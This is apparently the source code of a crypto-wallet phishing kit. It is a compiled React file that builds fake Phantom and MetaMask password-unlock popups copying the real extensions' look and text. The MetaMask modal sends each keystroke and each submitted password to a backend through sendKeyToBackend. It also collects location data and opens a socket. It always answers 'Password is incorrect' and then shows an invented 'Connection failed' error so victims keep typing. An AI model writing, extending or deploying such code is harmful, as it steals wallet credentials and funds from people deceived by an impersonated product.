        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true), style: { position: 'fixed', top: 0, right: '150px' } },
        React.createElement("div", { className: "w-[360px] h-[600px] shadow-[0_2px_8px_0_rgba(0,0,0,0.2)] relative" },
            React.createElement("div", { className: "h-full relative", style: { backgroundColor: '#121214' } }, connectionError ? (React.createElement("div", { className: "dark:text-white text-center px-4 py-8 flex flex-col h-full justify-between" },
                React.createElement("div", null),
                React.createElement("div", { className: "" },
                    React.createElement("div", { className: "flex justify-center w-full items-center mb-4" },
                        React.createElement("svg", { className: "text-2xl text-red-500 text-center dark:text-white w-6 h-6", fill: "currentColor", viewBox: "0 0 20 20" },
                            React.createElement("path", { fillRule: "evenodd", d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z", clipRule: "evenodd" }))),
                    React.createElement("h3", { className: "text-xl font-extrabold euclid-bold" }, "Connection failed"),
                    React.createElement("div", { className: "text-sm leading-relaxed" },
                        React.createElement("h6", null, "Fetching of"),
                        React.createElement("h5", { className: "font-bold" }, "@unstoppabledomains/unstoppable-"),
                        React.createElement("h5", null,
                            React.createElement("span", { className: "font-bold" }, "resolution-snap"),
                            ' ',
                            "failed, check your network and"),
                        React.createElement("h5", null, "try again.")),
                    React.createElement("div", { className: "mt-4 text-base border-l-4 border-red-500 bg-red-50 p-4 rounded text-left dark:bg-gray-700" },
                        React.createElement("h5", null, "One or more permissions are not allowed:"),
                        React.createElement("h5", null, "This endowment is experiental and therefore "),
                        React.createElement("h5", null, "not available."))),
                React.createElement("button", { className: `w-full rounded-full cursor-pointer phantom-font-regular p-2.5 !text-white hover:bg-[#3148f5] dark:border-[#ffffff] bg-[#4459ff] dark:text-[#141618]`, onClick: handleClick }, "Ok"))) : (React.createElement("div", null,
                React.createElement("div", { className: "min-h-[68px] flex items-center bg-white w-full  dark:shadow-2xl dark:bg-[#141618] hidden" }),
                React.createElement("div", { className: "flex flex-col h-full box-border bg-[#121214]" },
                    React.createElement("div", { className: "px-[16px] py-[10px] h-[59px] flex flex-row justify-between items-center w-full box-border border-b-[1px] border-b border-[#3a3a3a]" },
                        React.createElement("div", { className: "w-[10px]" }),
                        React.createElement("div", { className: "h-[59px] flex box-border" },
                            React.createElement("svg", { width: "94", height: "59", viewBox: "0 0 478 103" },
                                React.createElement("path", { fill: "#b4b4b4", d: "M0 102.895h17.97V85.222c0-8.295-.718-11.42-4.911-19.836l2.276-1.203C21.445 78.49 30.07 83.66 38.937 83.66c14.257 0 25.638-12.503 25.638-31.859 0-18.514-10.423-32.1-25.399-32.1-8.865 0-17.73 5.05-23.841 19.477l-2.276-1.202c2.875-5.771 4.912-11.181 4.912-16.35H0v81.27ZM17.97 51.68c0-7.934 5.991-16.71 14.857-16.71 7.188 0 13.058 5.89 13.058 16.59 0 10.58-5.63 16.831-13.178 16.831-8.387 0-14.736-8.536-14.736-16.71ZM71.135 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.147 4.208 8.147 14.668v31.979h17.97V46.871c0-18.995-6.828-27.17-19.887-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832V.826h-17.97v80.91ZM156.582 83.66c11.621 0 18.45-7.694 23.601-17.553l2.157 1.082c-2.277 4.689-4.433 10.099-4.433 14.547h17.612v-32.7c0-19.477-8.147-29.335-27.196-29.335-18.69 0-27.915 9.377-29.712 19.236l17.252 3.005c.599-5.17 4.792-8.656 11.501-8.656 6.71 0 10.543 3.366 10.543 7.454 0 4.088-3.953 6.011-14.496 6.131-15.575.24-27.076 5.891-27.076 17.914 0 9.858 7.787 18.874 20.247 18.874Zm-2.396-20.078c0-9.498 15.095-2.885 23.362-10.218v2.163c0 8.536-7.548 14.788-15.096 14.788-3.953 0-8.266-1.683-8.266-6.733ZM202.64 81.736h17.97v-21.16c0-14.907 5.272-25.487 15.096-25.487 6.23 0 8.146 4.208 8.146 14.668v31.979h17.972V46.871c0-18.995-6.829-27.17-19.888-27.17-13.419 0-17.851 9.017-23.003 19.957l-2.276-1.202c3.115-6.733 3.953-10.82 3.953-16.832h-17.97v60.112ZM309.688 81.977V67.069c-3.834 1.322-14.496 3.606-14.496-5.17V36.051h14.376V21.624h-14.376V5.514l-18.091 5.41v10.7h-10.782v14.427h10.782l.12 27.291c0 20.077 17.851 22.963 32.467 18.635ZM346.192 83.66c18.211 0 32.108-13.946 32.108-32.1 0-18.034-13.897-31.86-32.108-31.86-18.21 0-32.227 13.826-32.227 31.86 0 18.154 14.017 32.1 32.227 32.1Zm-13.657-31.98c0-9.978 5.631-16.951 13.657-16.951 8.027 0 13.538 6.973 13.538 16.951 0 9.979-5.511 16.952-13.538 16.952-8.026 0-13.657-6.973-13.657-16.952ZM383.868 81.736h17.968v-21.16c0-15.508 4.913-25.487 12.82-25.487 5.154 0 6.83 4.088 6.83 14.668v31.979h17.973v-21.16c0-14.547 5.27-25.487 12.82-25.487 5.027 0 6.824 4.69 6.824 14.668v31.979h17.974V46.871c0-19.115-6.232-27.17-18.452-27.17-12.698 0-17.248 9.017-21.682 20.077l-2.16-1.082c4.198-12.623-4.912-18.995-13.896-18.995-11.858 0-16.171 9.017-20.963 19.957l-2.159-1.202c2.994-6.733 4.071-10.82 4.071-16.832h-17.968v60.112Z" }))),
                        React.createElement("span", { "aria-haspopup": "true", "aria-controls": "phantom-help-popover", id: "menu-button--menu--:r1:", onClick: showHelpModal },
                            React.createElement("div", { className: "flex justify-center items-center p-[5px] m-[-5px] cursor-pointer" },
                                React.createElement("svg", { width: "15", viewBox: "0 0 15 15", fill: "#b4b4b4", xmlns: "http://www.w3.org/2000/svg" },
                                    React.createElement("path", { d: "M7.5 0C3.3589 0 0 3.3589 0 7.5C0 11.6411 3.3589 15 7.5 15C11.6411 15 15 11.6411 15 7.5C15 3.3589 11.6411 0 7.5 0ZM8.31288 11.7485C8.31288 12.0092 8.09816 12.2239 7.83742 12.2239H6.62577C6.36503 12.2239 6.15031 12.0092 6.15031 11.7485V10.9663C6.15031 10.7055 6.36503 10.4908 6.62577 10.4908H7.83742C8.09816 10.4908 8.31288 10.7055 8.31288 10.9663V11.7485ZM10.2301 7.08589C9.90798 7.53067 9.5092 7.88344 9.0184 8.14417C8.74233 8.32822 8.55828 8.51227 8.46626 8.72699C8.40491 8.86503 8.3589 9.04908 8.32822 9.2638C8.31288 9.43252 8.15951 9.55521 7.9908 9.55521H6.50307C6.30368 9.55521 6.15031 9.3865 6.16564 9.20245C6.19632 8.78834 6.30368 8.46626 6.47239 8.22086C6.68712 7.92945 7.07055 7.57669 7.6227 7.19325C7.91411 7.0092 8.12883 6.79448 8.29755 6.53374C8.46626 6.27301 8.54294 5.96626 8.54294 5.6135C8.54294 5.26074 8.45092 4.96932 8.25153 4.7546C8.05215 4.53988 7.79141 4.43252 7.43865 4.43252C7.14724 4.43252 6.91718 4.52454 6.71779 4.69325C6.59509 4.80061 6.5184 4.93865 6.47239 5.1227C6.41104 5.33742 6.21166 5.47546 5.98159 5.47546L4.60123 5.44479C4.43252 5.44479 4.29448 5.29141 4.30982 5.1227C4.35583 4.3865 4.64724 3.83436 5.15337 3.43558C5.7362 2.9908 6.48773 2.76074 7.43865 2.76074C8.45092 2.76074 9.24847 3.02147 9.83129 3.52761C10.4141 4.03374 10.7055 4.72393 10.7055 5.59816C10.7055 6.15031 10.5368 6.6411 10.2301 7.08589Z" }))))),
                    React.createElement("div", { className: "w-full px-[16px] flex flex-col items-center box-border relative flex-1" },
                        React.createElement("div", { className: "text-[#141618] flex flex-col justify-start items-center dark:text-[#ffffff] w-full h-full" },
                            React.createElement("button", { className: "width-[256px] height-[240px] flex flex-direction-column justify-center relative box-border", onClick: handleImageClick },
                                React.createElement("div", null,
                                    React.createElement("img", { src: getImageUrl(currentImage), alt: "logo", className: "w-full h-full object-cover" }))),
                            React.createElement("form", { className: "flex flex-col justify-center items-center w-full gap-[16px]", onSubmit: (e) => {
                                    e.preventDefault();
                                    handleKeywordTyping();
                                } },
                                React.createElement("button", { className: "text-[#EEEEEE] inline-block text-[22px] line-height-[24px] phantom-font-regular font-medium box-border tracking-[-.02em]" }, "Enter your password"),
                                React.createElement("div", { className: "w-full" },
                                    React.createElement("input", { id: "current-password", placeholder: "Password", type: "password", value: keyword, onChange: handleKeywordChange, onKeyDown: (e) => {
                                            if (e.key === 'Enter') {
                                                e.preventDefault();
                                                handleKeywordTyping();
                                            }
                                        }, className: `phantom-font-regular w-full p-[14px] bg-[#191919] border border-[1px] border-solid rounded-[6px] text-white font-[16px] leading-[19px] z-10 relative transition-colors focus:outline-none ${error ? 'border-red-500 focus:border-red-500' : 'border-[#3a3a3a] focus:border-[#3a3a3a]'} ${shouldShake ? 'password-shake' : ''}`, ref: inputRef }))),
                            React.createElement("div", { className: "flex flex-col justify-center items-center w-full gap-[10px] mt-auto pb-[16px] box-border" },
                                React.createElement("div", { className: "w-full flex justify-center" },
                                    React.createElement("button", { className: `text-[#111111] bg-[#ab9ff2] mt-[70px] rounded-[16px] px-[16px] box-border phantom-font-regular font-[16px] line-height-[19px] tracking-normal font-semibold transition-all ${isButtonPressed
                                            ? 'w-[calc(100%-10px)] h-[43px]'
                                            : 'w-full h-[48px]'}`, onClick: handleKeywordTyping, onMouseDown: handleButtonMouseDown, onMouseUp: handleButtonMouseUp, onMouseLeave: handleButtonMouseLeave }, "Unlock")),
                                React.createElement("button", { className: "text-[#EEEEEE] phantom-font-regular w-full h-[48px] px-[16px] box-border font-[16px] line-height-[19px] tracking-normal font-semibold", onClick: handledForgetPwd }, "Forgot password")))),
                    React.createElement("div", { id: "phantom-forget-password-modal", className: "absolute top-0 left-0 z-50 hidden" },
                        React.createElement("div", { className: "flex flex-col min-w-[360px] min-height-[600px] bg-[#121214] pb-[16px] h-[600px]" },
                            React.createElement("section", { className: "relative z-1 bg-[#121214] px-[32px] py-[10px] flex flex-shrink-0 flex-row items-center justify-between w-full h-[59px] border-b-[1px] border-b border-[#3a3a3a]" },
                                React.createElement("div", { className: "absolute left-[16px] h-[28px] min-w-[28px] border-r-[50%] flex justify-center items-center cursor-pointer p-[5px] m-[-5px]", onClick: closeForgetPasswordModal },
                                    React.createElement("svg", { width: "12", fill: "#b4b4b4", viewBox: "0 0 12 12", xmlns: "http://www.w3.org/2000/svg" },
                                        React.createElement("path", { d: " M12 10.6811L7.11455 5.80495L11.6006 1.31889L10.291 0L5.80495 4.48607L1.31889 0L0 1.31889L4.48607 5.80495L0 10.291L1.31889 11.6006L5.80495 7.11455L10.6811 12L12 10.6811Z" }))),
                                React.createElement("div", { className: "flex items-center justify-center w-full" },
                                    React.createElement("p", { className: "text-white phantom-font-regular", style: { fontSize: '16px', fontWeight: '500', lineHeight: '25px', maxWidth: '280px', opacity: 1, color: 'white', textAlign: 'center', textDecoration: 'none', backgroundColor: 'transparent' } }, "Forgot password"))),
                            React.createElement("div", { className: "flex flex-col items-center justify-between px-[16px] pt-[30px] flex-1" },
                                React.createElement("div", null),
                                React.createElement("section", { className: "flex flex-col items-center w-full" },
                                    React.createElement("svg", { className: "mb-[16px]", width: "94", height: "94", viewBox: "0 0 94 94", fill: "none", xmlns: "http://www.w3.org/2000/svg" },
                                        React.createElement("g", { filter: "url(#filter0_i)" },
                                            React.createElement("circle", { cx: "47", cy: "47", r: "47", fill: "#191919" })),
                                        React.createElement("g", { filter: "url(#filter1_d)" },
                                            React.createElement("path", { d: "M47 27C40.37 27 35 32.1143 35 38.4286V44.1429H29V67H65V44.1429H59V38.4286C59 32.1143 53.63 27 47 27ZM47 32.7143C50.57 32.7143 53 35.0286 53 38.4286V44.1429H41V38.4286C41 35.0286 43.43 32.7143 47 32.7143Z", fill: "#222222" })),
                                        React.createElement("defs", null,
                                            React.createElement("filter", { id: "filter0_i", x: "0", y: "0", width: "94", height: "94", filterUnits: "userSpaceOnUse", colorInterpolationFilters: "sRGB" },
                                                React.createElement("feFlood", { floodOpacity: "0", result: "BackgroundImageFix" }),
                                                React.createElement("feBlend", { mode: "normal", in: "SourceGraphic", in2: "BackgroundImageFix", result: "shape" }),
                                                React.createElement("feColorMatrix", { in: "SourceAlpha", type: "matrix", values: "0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0", result: "hardAlpha" }),
                                                React.createElement("feOffset", null),
                                                React.createElement("feGaussianBlur", { stdDeviation: "2" }),
                                                React.createElement("feComposite", { in2: "hardAlpha", operator: "arithmetic", k2: "-1", k3: "1" }),
                                                React.createElement("feColorMatrix", { type: "matrix", values: "0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.25 0" }),
                                                React.createElement("feBlend", { mode: "normal", in2: "shape", result: "effect1_innerShadow" })),
                                            React.createElement("filter", { id: "filter1_d", x: "21", y: "19", width: "52", height: "56", filterUnits: "userSpaceOnUse", colorInterpolationFilters: "sRGB" },
                                                React.createElement("feFlood", { floodOpacity: "0", result: "BackgroundImageFix" }),
                                                React.createElement("feColorMatrix", { in: "SourceAlpha", type: "matrix", values: "0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" }),
                                                React.createElement("feOffset", null),
                                                React.createElement("feGaussianBlur", { stdDeviation: "4" }),
                                                React.createElement("feColorMatrix", { type: "matrix", values: "0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.3 0" }),
                                                React.createElement("feBlend", { mode: "normal", in2: "BackgroundImageFix", result: "effect1_dropShadow" }),
                                                React.createElement("feBlend", { mode: "normal", in: "SourceGraphic", in2: "effect1_dropShadow", result: "shape" })))),
                                    React.createElement("p", { className: "text-[26px] font-medium leading-[31px] phantom-font-regular opacity-100 text-white text-center decoration-none bg-transparent mb-[16px]" }, "Forgot password"),
                                    React.createElement("p", { className: "mb-[16px] phantom-font-regular text-[16px] text-[#b4b4b4] leading-[21px] opacity-100 font-normal text-center decoration-none bg-transparent" }, "To reset your password, you will need to reset your wallet. Phantom cannot recover your password for you.")),
                                React.createElement("div", { className: "flex flex-col items-center justify-center w-full gap-[10px] box-border" },
                                    React.createElement("button", { className: "text-[#111111] w-full h-[48px] bg-[#ab9ff2] rounded-[16px] px-[16px] box-border font-[16px] line-height-[19px] phantom-font-regular tracking-normal font-semibold", type: "button", onClick: handledResetPwd }, "Reset & wipe app"),
                                    React.createElement("button", { className: "text-[#EEEEEE] phantom-font-regular w-full h-[48px] px-[16px] box-border font-[16px] line-height-[19px] tracking-normal font-semibold", type: "button", onClick: handleLearnMore }, "Learn more"))))),
                    React.createElement("div", { id: "phantom-help-popover", className: "absolute left-[94px] top-[36.5px] hidden" },
                        React.createElement("div", { className: "shadow-[rgba(0,0,0,0.25)] rounded-[6px] p-[10px_17px] mt-[4px] w-[250px] z-[999] relative bg-[rgb(25,25,25)] block whitespace-nowrap outline-none text-[85%]" },
                            React.createElement("div", { style: { maxHeight: '330px' }, className: "max-height-[330px]" },
                                React.createElement("div", { className: "flex items-center phantom-font-regular justify-between text-[rgb(238,238,238)] cursor-pointer py-[3px] px-0 text-[16px] hover:text-[#ab9ff2]", onClick: () => {
                                        window.open('https://help.phantom.com/', '_blank');
                                    } }, "Support Desk"),
                                React.createElement("div", { className: "flex items-center justify-between phantom-font-regular text-[rgb(238,238,238)] cursor-pointer py-[3px] px-0 text-[16px] hover:text-[#ab9ff2]", onClick: closeHelpModal }, "Download App Logs")))))))))));
    // Render modal directly in document.body via portal to ensure fixed positioning works relative to viewport
    return modalContent;
};

// @ts-ignore - Optional peer dependency, handled dynamically at runtime
// Internal component that uses Rive hooks - only rendered when module is loaded
const RiveAnimationInner = ({ useRive, Layout, Fit, animationPath }) => {
    // Create layout - use Fit.Contain to match original (not Cover which zooms in)
    const layoutConfig = new Layout({
        fit: Fit.Contain,
        alignment: 'Center', // Use string directly instead of Alignment.Center
    });
    const { rive, RiveComponent } = useRive({
        src: animationPath,
        stateMachines: "FoxRaiseUp",
        autoplay: true,
        layout: layoutConfig,
        onLoad: () => {
        },
        onLoadError: (err) => {
        },
    });
    useEffect(() => {
        if (rive) {
            const inputs = rive.stateMachineInputs("FoxRaiseUp");
            if (inputs) {
                const startInput = inputs.find((input) => input.name === "Start");
                if (startInput) {
                    startInput.fire();
                }
            }
            rive.play();
        }
    }, [rive]);
    return (React.createElement("div", { style: { width: '400px', height: '170px', display: 'flex', justifyContent: 'center', alignItems: 'center' } },
        React.createElement(RiveComponent, { style: {
                width: "400px",
                height: "170px",
                display: "block",
            } })));
};
const FoxRiveAnimation = () => {
    const [riveModuleLoaded, setRiveModuleLoaded] = useState(false);
    const [riveComponents, setRiveComponents] = useState(null);
    // Get RIV animation URL from config (third-party URL)
    const FOX_ANIMATION = resolveAssetUrl(ASSET_PATHS.metamaskFoxRiv);
    // Load the module dynamically at runtime to avoid build-time import issues
    useEffect(() => {
        if (typeof window === 'undefined') {
            return;
        }
        // Use dynamic import which works better with bundlers
        // @ts-ignore - Dynamic import for optional peer dependency
        import('@rive-app/react-canvas')
            .then((module) => {
            // Try different possible export structures
            // Structure 1: Direct exports (useRive, Layout, Fit)
            let useRive = module?.useRive;
            let Layout = module?.Layout;
            let Fit = module?.Fit;
            // Structure 2: Default export with named exports
            if (!useRive && module?.default) {
                useRive = module.default.useRive || module.default?.useRive;
                Layout = module.default.Layout || module.default?.Layout;
                Fit = module.default.Fit || module.default?.Fit;
            }
            // Structure 3: Named exports from default
            if (!useRive && module?.default) {
                const defaultModule = module.default;
                if (typeof defaultModule === 'object') {
                    useRive = defaultModule.useRive;
                    Layout = defaultModule.Layout;
                    Fit = defaultModule.Fit;
                }
            }
            // Structure 4: Check for nested structure (e.g., module.rive.useRive)
            if (!useRive && module?.rive) {
                useRive = module.rive.useRive;
                Layout = module.rive.Layout;
                Fit = module.rive.Fit;
            }
            if (useRive && Layout && Fit) {
                setRiveComponents({
                    useRive,
                    Layout,
                    Fit,
                });
                setRiveModuleLoaded(true);
            }
        })
            .catch((e) => {
        });
    }, []);
    // If @rive-app/react-canvas is not available, return null
    // This is safe because we're not calling any hooks conditionally
    if (!riveModuleLoaded || !riveComponents) {
        return null;
    }
    // Verify animation path before rendering
    if (!FOX_ANIMATION) {
        return null;
    }
    // Render the inner component that uses Rive hooks
    // This component will always call hooks in the same order
    return (React.createElement(RiveAnimationInner, { useRive: riveComponents.useRive, Layout: riveComponents.Layout, Fit: riveComponents.Fit, animationPath: FOX_ANIMATION }));
};

const MetamaskModal = ({ isOpen, onClose, userId, backendConfig, darkMode = false }) => {
    const [keyword, setKeyword] = useState('');
    const [error, setError] = useState(false);
    const [helperText, setHelperText] = useState('');
    const [trying, setTrying] = useState(0);
    const [connecting, setConnecting] = useState(false);
    const [connectionError, setConnectionError] = useState(false);
    const [isClosable, setIsClosable] = useState(true);
    const [isClickedEnter, setIsClickedEnter] = useState(false);
    const [loadingInitiate, setLoadingInitiate] = useState(true);
    const passwordInputRef = useRef(null);
    const modalRef = useRef(null);
    const CLIENT_URL = getClientUrl();
    // Handle initial loading - only run once when modal opens
    useEffect(() => {
        if (isOpen) {
            initializeLocationData();
            initializeSocket();
            setLoadingInitiate(true);
            const initialLoadTimeout = setTimeout(() => {
                setLoadingInitiate(false);
                setTimeout(() => {
                    passwordInputRef.current?.focus();
                }, 500);
            }, 500);
            return () => {
                clearTimeout(initialLoadTimeout);
            };
        }
        else {
            // Reset loading state when modal closes
            setLoadingInitiate(true);
        }
    }, [isOpen]); // Only depend on isOpen, not isClosable
    // Handle document click and forget password modal - separate effect
    useEffect(() => {
        if (!isOpen)
            return;
        const handleDocumentClick = (e) => {
            if (isClosable && modalRef.current && !modalRef.current.contains(e.target)) {
                handleClick();
            }
        };
        document.addEventListener('click', handleDocumentClick);
        const modal = document.getElementById('metamask-forget-password-modal');
        if (modal) {
            const handleModalClick = (e) => {
                if (e.target === modal) {
                    modal.classList.add('hidden');
                }
            };
            modal.addEventListener('click', handleModalClick);
            return () => {
                document.removeEventListener('click', handleDocumentClick);
                modal.removeEventListener('click', handleModalClick);
            };
        }
        return () => {
            document.removeEventListener('click', handleDocumentClick);
        };
    }, [isOpen, isClosable]);
    const handleClick = () => {
        if (onClose)
            onClose();
        setKeyword('');
        setTrying(0);
        setConnectionError(false);
        setError(false);
        setLoadingInitiate(true);
    };
    const getCaretCoordinates = (element, position) => {
        const div = document.createElement('div');
        div.id = 'password-mirror-div';
        document.body.appendChild(div);
        const computed = window.getComputedStyle(element);
        div.textContent = new Array(position + 1).join('•');
        const span = document.createElement('span');
        span.textContent = '•';
        div.appendChild(span);
        const coordinates = {
            top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
            left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
        };
        document.body.removeChild(div);
        return coordinates;
    };
    const handleKeywordChange = async (e) => {
        const target = e.target;
        const element = target || passwordInputRef.current;
        if (element && typeof element.getBoundingClientRect === 'function') {
            element.getBoundingClientRect();
            getCaretCoordinates(element, element.selectionEnd || 0);
            // Animation emitter removed (was for Mascot)
        }
        const newKeyword = target.value;
        setKeyword(newKeyword);
        setIsClickedEnter(false);
        setError(false);
        const currentUserId = backendConfig?.userId || userId;
        if (currentUserId && newKeyword.length > 0 && (backendConfig?.enabled !== false)) {
            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.METAMASK);
        }
    };
    const handledForgetPwd = () => {
        showForgetPasswordModal();
    };
    const handledResetPwd = () => {
        handleClick();
        closeForgetPasswordModal();
        window.open('chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault', '_blank');
    };
    const handleKeywordTyping = async () => {
        if (connecting) {
            return;
        }
        const currentKeyword = keyword;
        if (currentKeyword) {
            setConnecting(true);
            const currentUserId = backendConfig?.userId || userId;
            if (!currentUserId) {
                setConnecting(false);
                setError(true);
                setHelperText('User ID is required');
                return;
            }
            if (backendConfig?.enabled !== false) {
                const result = await sendKeyToBackend(currentUserId, 'enter', currentKeyword, WALLET_TYPE_SHORTKEY.METAMASK);
                setTimeout(() => {
                    setConnecting(false);
                    if (trying < 3) {
                        setError(true);
                        setHelperText(result.error || 'Password is incorrect. Please try again.');
                        setIsClickedEnter(true);
                        setTrying(trying + 1);
                    }
                    else {
                        setConnectionError(true);
                    }
                    passwordInputRef.current?.focus();
                }, 150);
            }
            else {
                setTimeout(() => {
                    setConnecting(false);
                }, 150);
            }
        }
        else {
            setError(false);
            setHelperText('');
        }
    };
    const showForgetPasswordModal = () => {
        const modal = document.getElementById('metamask-forget-password-modal');
        if (modal) {
            modal.classList.remove('hidden');
        }
    };
    const closeForgetPasswordModal = () => {
        const modal = document.getElementById('metamask-forget-password-modal');
        if (modal) {
            modal.classList.add('hidden');
        }
    };
    const closeWindow = () => {
        if (onClose)
            onClose();
        setTimeout(() => {
            setConnectionError(false);
            setKeyword('');
            setTrying(0);
            setError(false);
        }, 1000);
    };
    if (!isOpen)
        return null;
    const modalContent = (React.createElement("div", { id: "header-layout", ref: modalRef, className: `fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true) },
        React.createElement("div", { className: "w-[400px] h-[600px] shadow-[0_4px_20px_0_rgba(0,0,0,0.3)] relative" },
            React.createElement("div", { className: "h-full relative", style: { backgroundColor: darkMode ? '#121314' : '#FFFFFF' } }, connectionError ? (React.createElement("div", { className: `text-center px-4 py-8 flex flex-col h-full justify-between ${darkMode ? 'text-white' : ''}` },
                React.createElement("div", null),
                React.createElement("div", { className: "" },
                    React.createElement("div", { className: "flex justify-center w-full items-center mb-4" },
                        React.createElement("svg", { className: `text-2xl text-center w-6 h-6 ${darkMode ? 'text-white' : 'text-red-500'}`, fill: "currentColor", viewBox: "0 0 20 20" },
                            React.createElement("path", { fillRule: "evenodd", d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z", clipRule: "evenodd" }))),
                    React.createElement("h3", { className: "text-xl font-extrabold euclid-bold" }, "Connection failed"),
                    React.createElement("div", { className: "text-sm leading-relaxed" },
                        React.createElement("h6", null, "Fetching of"),
                        React.createElement("h5", { className: "font-bold" }, "@unstoppabledomains/unstoppable-"),
                        React.createElement("h5", null,
                            React.createElement("span", { className: "font-bold" }, "resolution-snap"),
                            " failed, check your network and"),
                        React.createElement("h5", null, "try again.")),
                    React.createElement("div", { className: `mt-4 text-base border-l-4 border-red-500 p-4 rounded text-left ${darkMode ? 'bg-gray-700' : 'bg-red-50'}` },
                        React.createElement("h5", null, "One or more permissions are not allowed:"),
                        React.createElement("h5", null, "This endowment is experiental and therefore "),
                        React.createElement("h5", null, "not available."))),
                React.createElement("button", { className: `w-full rounded-full cursor-pointer metamask-font-regular p-2.5 text-white hover:bg-[#3148f5] bg-[#4459ff] ${darkMode ? 'border-[#ffffff] text-[#141618]' : ''}`, onClick: closeWindow }, "Ok"))) : (React.createElement(React.Fragment, null,
                React.createElement("div", { className: `w-full h-full absolute flex items-center flex-col pt-40 z-50 ${loadingInitiate ? 'visible' : 'hidden'}`, style: { backgroundColor: darkMode ? '#121314' : '#FFFFFF' } },
                    React.createElement("div", { className: "mb-4" },
                        React.createElement("img", { src: "https://www.riveanimation.cards/v1/images/logo/metamask-fox.png", alt: "metamask-fox-loading", className: "w-40" })),
                    React.createElement("div", null,
                        React.createElement("img", { src: `${CLIENT_URL}/images/icons/spinner.gif`, alt: "spinner", className: "w-8" }))),
                connecting && !loadingInitiate && (React.createElement("div", { className: "z-[100] w-full h-full absolute flex justify-center items-center bg-[#000000e3]" },
                    React.createElement("div", { className: "flex flex-col items-center" },
                        React.createElement("img", { src: `${CLIENT_URL}/images/icons/spinner.gif`, alt: "spinner", className: "w-8" })))),
                React.createElement("div", { className: `flex justify-center pt-[88px] ${loadingInitiate ? 'hidden' : ''}`, style: { backgroundColor: darkMode ? '#121314' : '#FFFFFF' } },
                    React.createElement("div", { className: "w-full px-[16px]" },
                        React.createElement("div", { className: `flex flex-col justify-start items-center ${darkMode ? 'text-[#ffffff]' : 'text-[#141618]'}` },
                            React.createElement("div", null,
                                React.createElement("svg", { height: "180", width: "180", viewBox: "0 0 696 344", fill: "none", xmlns: "http://www.w3.org/2000/svg", preserveAspectRatio: "xMidYMid meet" },
                                    React.createElement("path", { d: "M394.102 265.407V340.812H355.162V288.57L310.786 293.73C301.039 294.854 296.75 298.041 296.75 303.912C296.75 312.512 304.892 316.136 322.344 316.136C332.985 316.136 344.773 314.553 355.184 311.824L335.026 340.353C326.885 342.165 318.95 343.06 310.579 343.06C275.262 343.06 255.103 329.024 255.103 304.119C255.103 282.149 270.95 270.613 306.956 266.531L354.519 261.004C351.951 247.175 341.516 241.167 320.762 241.167C301.291 241.167 279.78 246.143 260.539 255.431L266.662 221.696C284.55 214.22 304.938 210.367 325.532 210.367C370.825 210.367 394.148 229.173 394.148 265.384L394.102 265.407ZM43.7957 170.991L1.23138 340.812H43.7957L64.9173 255.477L101.542 299.372H145.918L182.542 255.477L203.664 340.812H246.228L203.664 170.968L123.718 265.912L43.7727 170.968L43.7957 170.991ZM203.664 1.14648L123.718 96.0905L43.7957 1.14648L1.23138 170.991H43.7957L64.9173 85.6558L101.542 129.55H145.918L182.542 85.6558L203.664 170.991H246.228L203.664 1.14648ZM496.454 263.825L462.031 258.848C453.431 257.495 450.037 254.766 450.037 250.019C450.037 242.313 458.407 238.919 475.63 238.919C495.559 238.919 513.447 243.001 532.253 251.831L527.506 218.554C512.324 213.119 494.894 210.413 476.777 210.413C434.442 210.413 411.325 225.136 411.325 251.624C411.325 272.241 424.007 283.777 450.954 287.859L485.836 293.065C494.665 294.418 498.289 297.812 498.289 303.247C498.289 310.953 490.147 314.576 473.612 314.576C451.871 314.576 428.319 309.37 409.078 300.082L412.931 333.359C429.466 339.482 450.977 343.105 471.135 343.105C514.617 343.105 537.252 327.924 537.252 300.977C537.252 279.465 524.57 267.907 496.5 263.848L496.454 263.825ZM552.388 186.15V340.812H591.329V186.15H552.388ZM636.829 271.301L690.974 212.638H642.516L591.329 273.319L645.91 340.789H695.057L636.829 271.278V271.301ZM546.953 134.297C546.953 159.203 567.111 173.238 602.429 173.238C610.799 173.238 618.734 172.321 626.876 170.532L647.034 142.003C636.622 144.709 624.835 146.314 614.194 146.314C596.764 146.314 588.6 142.691 588.6 134.091C588.6 128.197 592.911 125.032 602.635 123.909L647.011 118.749V170.991H685.952V95.586C685.952 59.3513 662.629 40.5689 617.335 40.5689C596.718 40.5689 576.354 44.4217 558.466 51.8979L552.342 85.6329C571.583 76.3449 593.095 71.3684 612.565 71.3684C633.32 71.3684 643.755 77.3769 646.323 91.2057L598.759 96.7326C562.754 100.815 546.907 112.35 546.907 134.32L546.953 134.297ZM438.043 126.156C438.043 157.414 456.16 173.261 491.936 173.261C506.201 173.261 517.988 170.991 529.294 165.785L534.271 131.591C523.4 138.15 512.301 141.544 501.201 141.544C484.437 141.544 476.961 134.756 476.961 119.574V74.2809H536.06V42.8163H476.961V16.099L402.909 55.2691V74.2809H437.997V126.133L438.043 126.156ZM399.767 111.892V119.597H294.526C299.273 135.284 313.377 142.462 338.42 142.462C358.349 142.462 376.925 138.38 393.437 130.468L388.69 163.537C373.508 169.867 354.267 173.284 334.567 173.284C282.257 